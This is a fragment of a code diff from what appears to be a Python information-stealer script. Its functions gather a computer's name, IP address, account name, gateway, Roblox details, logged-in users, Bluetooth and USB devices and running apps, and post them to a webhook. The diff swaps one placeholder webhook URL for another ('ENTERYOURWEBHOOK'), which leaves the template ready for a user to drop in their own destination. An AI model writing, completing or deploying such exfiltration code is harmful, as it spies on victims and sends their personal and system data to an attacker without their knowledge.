@@ -209,7 +209,7 @@ def get_running_apps():
     return running_apps
 
 def send_to_webhook(pc_name, ip, system_info, main_browser, account_name, default_gateway, device_type, roblox_info, logged_in_users, performance_info, bluetooth_devices):
-    webhook_url = "madebyyanenteryourwebhook"
+    webhook_url = "ENTERYOURWEBHOOK"
     data = {
         "content": f"PC Name: {pc_name}\nIP Address: {ip}\nSystem Info: {system_info}\nMain Browser: {main_browser}\nAccount Name: {account_name}\nDefault Gateway: {default_gateway}\nDevice Type: {device_type}\nRoblox Console Info: {roblox_info}\nLogged-in Users: {logged_in_users}\nPerformance Info: {performance_info}\nBluetooth Devices: {bluetooth_devices}"
     }
@@ -224,7 +224,7 @@ def send_to_webhook(pc_name, ip, system_info, main_browser, account_name, defaul
         print(f"An error occurred: {e}")
 
 def send_usb_devices_to_webhook(pc_name, usb_devices):
-    webhook_url = "madebyyanenteryourwebhook"
+    webhook_url = "ENTERYOURWEBHOOK"
     data = {
         "content": f"PC Name: {pc_name}\nUSB Devices: {usb_devices}"
     }
@@ -239,7 +239,7 @@ def send_usb_devices_to_webhook(pc_name, usb_devices):
         print(f"An error occurred while loading USB Devices: {e}")
 
 def send_running_apps_to_webhook(pc_name, running_apps):
-    webhook_url = "madebyyanenteryourwebhook"
+    webhook_url = "ENTERYOURWEBHOOK"
     running_apps_str = '\n'.join(running_apps[:10]) 
     if len(running_apps_str) > 2000:
         running_apps_str = running_apps_str[:1997] + "..." 
